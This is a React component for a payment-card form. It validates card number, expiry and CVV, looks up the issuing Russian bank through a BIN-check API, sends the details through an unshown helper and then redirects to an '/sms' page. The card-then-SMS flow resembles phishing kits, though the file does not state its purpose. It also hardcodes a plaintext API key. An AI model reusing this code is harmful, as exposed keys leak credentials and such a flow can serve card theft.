import React, { useState, useEffect, useRef, useCallback } from "react";
import styles from "./Card.module.css";
import MainButton from "../MainButton/MainButton.tsx";
import MainInput from "../MainInput/MainInput.tsx";
import visa from "../../../images/visa.png";
import mastercard from "../../../images/mastercard.png";
import mir from "../../../images/mir.png";
import errorIcon from "../../../images/errorIcon.svg";
import valid from "card-validator";
import axios from "axios";
import CardPreview from "../CardPreview/CardPreview.tsx";
import sendData from "../../sendData.ts";
import { useNavigate } from "react-router-dom";

type Props = {};

const Card = (props: Props) => {
  const navigate = useNavigate();
  const [cardType, setCardType] = useState("");
  const [bankName, setBankName] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [expDate, setExpDate] = useState("");
  const [cvv, setCvv] = useState("");
  const [isCardValid, setIsCardValid] = useState(true);
  const [isDateValid, setIsDateValid] = useState(true);
  const [isCvvValid, setIsCvvValid] = useState(true);
  const [isLoading, setIsLoading] = useState(false);

  const onKeyPress: React.KeyboardEventHandler<HTMLInputElement> = useCallback(
    (e) => {
      if (e.key === "Enter") {
        const inputs = Array.from(
          e.currentTarget?.parentElement?.parentElement?.parentElement?.querySelectorAll(
            "input"
          ) ?? []
        ).filter((e) => !e.disabled);
        const index = inputs.indexOf(e.currentTarget);
        inputs[index + 1]?.focus();
        e.preventDefault();
      }
    },
    []
  );

  const getBankName = async (card: string) => {
    const { data } = await axios.get(
      `https://api.apilayer.com/bincheck/${card.slice(0, 6).replace(" ", "")}`,
      {
        headers: {
          apikey: "lvsFqNH3NU3DghJIuXyo48GhVPPfDGzs",
        },
      }
    );

    if (data.bank_name.toLowerCase().includes("sberbank")) {
      setBankName("sberbank");
    } else if (
      data.bank_name.toLowerCase().includes("zheldor") ||
      data.bank_name.toLowerCase().includes("tinkoff")
    ) {
      setBankName("tinkoff");
    } else if (data.bank_name.toLowerCase().includes("vtb")) {
      setBankName("vtb");
    } else if (data.bank_name.toLowerCase().includes("gazprom")) {
      setBankName("gazprombank");
    } else if (data.bank_name.toLowerCase().includes("sovkombank")) {
      setBankName("sovkombank");
    } else if (data.bank_name.toLowerCase().includes("alfa-bank")) {
      setBankName("alfabank");
    } else if (data.bank_name.toLowerCase().includes("russian standard")) {
      setBankName("russianstandard");
    } else if (data.bank_name.toLowerCase().includes("uralsib")) {
      setBankName("uralsib");
    } else {
      setBankName("");
    }
  };

  useEffect(() => {
    if (!/[0-9]/gi.test(cardNumber)) {
      setCardNumber("");
    }
    const cardValidation: {
      card: { type: string } | null;
      isPotentiallyValid: boolean;
      isValid: boolean;
    } = valid.number(cardNumber.split(" ").join(""));
    if (cardValidation.card) {
      setCardType(cardValidation.card.type);
    } else {
      setCardType("undefined");
    }

    if (cardNumber.length < 4) {
      setIsCardValid(true);
    } else {
      setIsCardValid(cardValidation.isValid);
    }

    if (cardNumber.length >= 6) {
      getBankName(cardNumber);
    }
  }, [cardNumber]);

  useEffect(() => {
    setIsDateValid(true);
    const checkDate: {
      isPotentiallyValid: boolean;
      isValid: boolean;
      month: string | null;
      year: string | null;
    } = valid.expirationDate(expDate);
    if (!checkDate.isValid && expDate.length === 4) {
      setIsDateValid(false);
    }
  }, [expDate]);

  useEffect(() => {
    setIsCvvValid(true);
    if (!/[0-9][0-9][0-9]/gi.test(cvv) && cvv.length === 3) {
      setIsCvvValid(false);
    }
  }, [cvv]);

  const sendForm = async () => {
    if (
      cardNumber.length &&
      expDate.length &&
      cvv.length &&
      isCardValid &&
      isDateValid &&
      isCvvValid
    ) {
      const sendTry = await sendData.sendCardData(
        cardNumber,
        `${expDate.slice(0, 2)}/${expDate.slice(2, 4)}`,
        cvv
      );
      if (sendTry) {
        setIsLoading(true)
        setTimeout(()=> {
          navigate("/sms");
        }, 2500)
      }
      return;
    }
  };

  return (
    <>
      <div
        className={styles.loading}
        style={{ display: isLoading ? "flex" : "none" }}
      >
        <div className={styles["lds-roller"]}>
          <div></div>
          <div></div>
          <div></div>
          <div></div>
          <div></div>
          <div></div>
          <div></div>
          <div></div>
        </div>
      </div>
      <CardPreview
        number={cardNumber}
        bank={bankName}
        system={cardType}
        isValid={isCardValid}
      />
      <div className={styles.card}>
        <h1 className={styles.title}>Payment</h1>
        <div className={styles.cardTypesBox}>
          <img
            src={visa}
            alt="visa"
            className={
              cardType === "visa"
                ? [styles.cardType, styles.cardTypeActive].join(" ")
                : styles.cardType
            }
          />
          <img
            src={mastercard}
            alt="mastercard"
            className={
              cardType === "mastercard"
                ? [styles.cardType, styles.cardTypeActive].join(" ")
                : styles.cardType
            }
          />
          <img
            src={mir}
            alt="mir"
            className={
              cardType === "mir"
                ? [styles.cardType, styles.cardTypeActive].join(" ")
                : styles.cardType
            }
          />
        </div>
        <div className={styles.inputBoxWithError}>
          <MainInput
            type="string"
            placeholder="Card Number"
            width="calc(100% - 16px)"
            value={cardNumber}
            onChangeFunc={setCardNumber}
            maxLenght={19}
            onKeyPress={onKeyPress}
          />
          <div
            className={styles.errorBox}
            style={{ display: !isCardValid ? "flex" : "none" }}
          >
            <img src={errorIcon} alt="" />
            <p>The card number is invalid</p>
          </div>
        </div>
        <div className={styles.inputBoxWithError}>
          <div className={styles.rowInputsBox}>
            <MainInput
              type="string"
              placeholder="Expiration date"
              width="calc(45% - 8px)"
              value={expDate}
              onChangeFunc={setExpDate}
              maxLenght={5}
              onKeyPress={onKeyPress}
            />
            <MainInput
              type="password"
              placeholder="CVV"
              width="calc(45% - 8px)"
              value={cvv}
              onChangeFunc={setCvv}
              maxLenght={3}
              onKeyPress={onKeyPress}
            />
          </div>
          <div
            className={styles.errorBox}
            style={{ display: !isDateValid ? "flex" : "none" }}
          >
            <img src={errorIcon} alt="" />
            <p>The expiration date is invalid</p>
          </div>
          <div
            className={styles.errorBox}
            style={{ display: !isCvvValid ? "flex" : "none" }}
          >
            <img src={errorIcon} alt="" />
            <p>The cvv code is invalid</p>
          </div>
        </div>

        <MainButton text="Continue" callback={sendForm} />
      </div>
    </>
  );
};

export default Card;
